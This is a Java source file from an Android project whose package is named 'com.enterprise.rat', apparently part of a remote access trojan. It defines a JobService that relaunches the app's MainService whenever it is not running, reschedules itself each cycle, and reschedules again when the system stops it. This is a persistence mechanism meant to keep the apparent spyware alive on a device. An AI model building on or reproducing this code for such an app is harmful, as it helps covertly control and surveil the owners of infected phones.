package com.enterprise.rat.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import com.enterprise.rat.utils.PersistenceManager;

public class KeepAliveJobService extends JobService {

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d("KeepAliveJob", "Job started");
        // Check if MainService is running; if not, start it
        Intent serviceIntent = new Intent(this, MainService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e("KeepAliveJob", "Failed to start service", e);
        }
        // Reschedule for next cycle
        PersistenceManager.scheduleKeepAlive(this);
        jobFinished(params, false);
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        // Restart if stopped
        PersistenceManager.scheduleKeepAlive(this);
        return true;
    }
}
